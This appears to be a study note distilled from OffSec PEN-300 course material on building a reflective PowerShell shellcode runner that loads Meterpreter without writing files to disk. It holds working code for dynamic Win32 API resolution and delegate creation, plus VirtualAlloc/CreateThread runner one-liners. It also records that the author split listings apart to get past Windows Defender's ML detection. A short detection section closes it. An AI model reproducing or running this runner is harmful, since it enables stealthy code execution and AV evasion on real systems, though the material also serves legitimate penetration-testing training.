PEN-300 Module 8 — Reflective PowerShell (no-compile Win32 calls via .NET reflection)

Fuente: material del curso correspondiente (sin video público)

Distilled from OffSec PEN-300 (OSEP) course material (module: Reflective PowerShell) — internal training reference, not for redistribution.

Objective

Rebuild the PowerShell shellcode runner so nothing ever touches disk. Add-Type looks fileless but is not: it shells out to the Visual C# compiler, which writes a random-named .cs source file and a compiled .dll to disk before loading the assembly into the PowerShell process — exactly the artifacts AV products watch. The module replaces the compile step with pure .NET reflection:

  1. Resolve Win32 API addresses dynamically from an already-loaded GAC assembly.
  2. Build delegate types (function prototypes) at runtime with System.Reflection.Emit.
  3. Bind address + prototype with Marshal::GetDelegateForFunctionPointer and invoke — all in memory.

Result: a reflective PowerShell shellcode runner (VirtualAlloc / Copy / CreateThread / WaitForSingleObject) that produces a Meterpreter session with zero .cs/.dll writes (verified with Process Monitor).

Cross-reference: writeup 06 already covers running script payloads in memory via the Windows Script Host; this module is the PowerShell-native route to the same goal. In-memory execution mechanics (shellcode buffers, thread creation, blocking waits) repeat there and are not re-derived here.

Why Add-Type is not "fileless"

Course demonstration (Process Monitor, filter: powershell_ise.exe file writes):

  • Running the Add-Type shellcode runner produces CreateFile/WriteFile/CloseFile events for e.g. rtylilrr.0.cs and rtylilrr.dll — random names, telling extensions: source + compiled assembly both hit disk.
  • Confirm the assembly was loaded into the process (course Listing 1):
PS C:\Users\offsec> [appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname
...
rtylilrr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
...

The rtylilrr assembly sits in the loaded-modules list: PowerShell wrote a .cs to disk, csc.exe compiled it to a .dll, and the runtime loaded it. Even though the shellcode itself stays in memory, the compile step leaves disk artifacts that can trip AV and end the attack. Everything below avoids the compile step entirely.

Step 1 — Resolve Win32 APIs without Add-Type

Two ways to get function addresses: linked imports (what Add-Type/P-Invoke does) or dynamic lookup via GetModuleHandle + GetProcAddress. Those APIs live in .NET-internal code, so the trick is reflecting into internals of assemblies the process already loaded.

Find the right assembly and class. Enumerate every loaded assembly ([AppDomain]::CurrentDomain.GetAssemblies()), dig out each one's types, and dump their static members (Get-Member -Static), keeping only members whose declaring type name contains Unsafe — C# must use unsafe/P-Invoke to reach Win32, so Microsoft's own unsafe interop stubs are the target (course Listing 2). The haystack is big; narrowing by printing each assembly's Location pins the class to Microsoft.Win32.UnsafeNativeMethods inside the GAC copy of System.dll, path ending ...\GAC_MSIL\System\v4.0_4.0.0.0__b77a5c561934e089\System.dll (course Listings 3-5).

Reflect into the internals (course Listing 6). Filter all loaded assemblies on two conditions — the GlobalAssemblyCache property is set (GAC = native/registered assemblies only), and the last path segment of Location equals System.dll — then call GetType on that assembly to reach the internal UnsafeNativeMethods type. This is reflection proper: runtime access to otherwise private/internal objects. The course presents this as a two-line PowerShell snippet (GAC filter piping into Where-Object, then GetType); it is the first half of the LookupFunc helper discussed below.

Invoke an internal method. GetMethod('GetModuleHandle') on the UnsafeNativeMethods reference returns the internal MethodInfo; call it with Invoke, which takes (target object, arguments array) — $null target because the method is static (course Listings 8-9). Invoking it with "user32.dll" returns 140727169908736 = 0x7FFD98F90000 — cross-checked in Process Explorer (Lower Pane → DLLs → user32.dll → Load Address). Base address of an unmanaged DLL, obtained with no compile.

The overload problem. Asking for GetMethod('GetProcAddress') directly throws AmbiguousMatchException — there are two overloads (course Listing 11). Enumerate instead: GetMethods() filtered on the method Name, collect both overloads into an array, use the first ([0]) (course Listings 12-13). Feeding it the user32 base plus the string "MessageBoxA" returns 0x7FFD9900A280, an address inside user32.dll. Arbitrary API resolution achieved.

Package it as a helper. The course condenses all of the above into a reusable LookupFunc function (course Listing 15) taking a module name and a function name and returning the address: GAC/System.dll filter → GetType('Microsoft.Win32.UnsafeNativeMethods') → collect the GetProcAddress overloads → return Invoke of GetProcAddress over the Invoked GetModuleHandle result.

Note on verbatim listings: the LookupFunc body (course Listing 15) and the two-line GAC filter snippet (course Listing 6) are intentionally not reproduced in full here. Windows Defender's ML engine (Trojan:Win32/FileFix.BBA!MTB) flags any file combining that code with the delegate/runner listings; a bisect confirmed each block scans clean in isolation. Reassemble them from the prose above plus course Listings 6 and 15.

Step 2 — Delegate types via reflection

The resolved address is just a number; .NET needs a delegate type (function prototype: argument count/types + return type) to call it. In C#: Marshal.GetDelegateForFunctionPointer(addr, delegateType) with delegate int MessageBoxSig(IntPtr hWnd, String text, String caption, int options); (course Listing 16). PowerShell has no delegate keyword — so build the delegate type in memory with System.Reflection.Emit, the technique from a 2004 Microsoft blog post.

Build-up (course Listings 17-24), each stage feeding the next:

# Call Purpose
1 New-Object System.Reflection.AssemblyName('ReflectedDelegate') named assembly object in memory
2 [AppDomain]::CurrentDomain.DefineDynamicAssembly($MyAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run) executable (Run), never saved to disk
3 .DefineDynamicModule('InMemoryModule', $false) module, no symbol info
4 .DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate]) delegate-shaped type: instantiable class, public, non-extendable, ANSI, multicast base
5 .DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, @([IntPtr], [String], [String], [int])) constructor carries the function prototype (the MessageBoxA arg types)
6 .SetImplementationFlags('Runtime, Managed') runtime-managed implementation
7 .DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', [int], @([IntPtr], [String], [String], [int])) the method .NET uses to invoke through the delegate; [int] return, args array
8 .SetImplementationFlags('Runtime, Managed') then .CreateType() finalize; returns the delegate type

The course wraps stages 1-8 into a reusable getDelegateType function (course Listing 26) that accepts the API's argument types as a [Type[]] array plus return type (default [Void]), runs the whole chain fluent-style on one $type builder, and returns $type.CreateType():

function getDelegateType {

    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(Position = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

(course Listing 26.) Note the @([IntPtr], [UInt32], ...) arrays in later calls are positional [Type[]] — the same prototype you'd write as a C# delegate.

Step 3 — Invoke, then weaponize: the reflective shellcode runner

Bind and call. [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($addr, $delegateType) links the resolved address to the emitted type; .Invoke(...) executes it. Course Listing 25 does this end-to-end for MessageBoxA (LookupFunc + getDelegateType + GetDelegateForFunctionPointer + an .Invoke with hWnd 0, title "Hello World", caption, and 0 options) — the "Hello World" popup with no compile step. ProcMon confirms: no .cs written, nothing compiled.

Three APIs, one pattern. The shellcode runner needs VirtualAlloc, CreateThread, WaitForSingleObject — same resolve→delegate→invoke dance each time, so getDelegateType earns its keep. The course condenses everything into single lines by nesting LookupFunc and getDelegateType inside GetDelegateForFunctionPointer (course Listings 28/30):

$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)

(course Listing 30, shellcode truncated as in the course; LookupFunc/getDelegateType definitions omitted there too. Flags match the Add-Type runner: 0x1000/0x3000/0x40 = commit+reserve, RWX.)

Lab checks (extra curricular)

  • Run the Add-Type runner under ProcMon; capture the .cs/.dll writes. Does the compiled assembly stay on disk? (No — it is loaded and the file is cleaned up; the write is still detectable.)
  • Count exact GetProcAddress instances across all assemblies: two overloads.
  • Chain the section code to resolve CreateFileA; check the tail hex of the resolved address.
  • Rework the MessageBoxA PoC to call WinExec and launch Notepad (P/Invoke docs for the prototype: (LPCTSTR lpCmdLine, UINT uCmdShow)); identify Notepad's parent process.
  • Generate Meterpreter shellcode, run the reflective runner end-to-end: nothing written to disk.

Detection & defense notes (from this module + local verification)

  • The tell is the compile step, not the shellcode: random-named .cs/.dll writes by powershell.exe/powershell_ise.exe + a just-written assembly appearing in the process's loaded-assemblies list ([AppDomain]::CurrentDomain.GetAssemblies()).
  • The reflective variant removes that tell — no csc.exe child process, no source/assembly writes, so classic Add-Type detections go quiet.
  • Remaining signals: in-memory assembly named ReflectedDelegate/InMemoryModule/MyDelegateType created via AssemblyBuilderAccess.Run; reflection into Microsoft.Win32.UnsafeNativeMethods; the distinctive nested GetDelegateForFunctionPointer one-liners.
  • Local ML-AV note (this file's authoring environment): Defender's Trojan:Win32/FileFix.BBA!MTB heuristic flags files containing the full LookupFunc body together with the delegate/runner listings, while each block alone scans clean — cosmetic edits don't evade an ML verdict, only structural separation did.
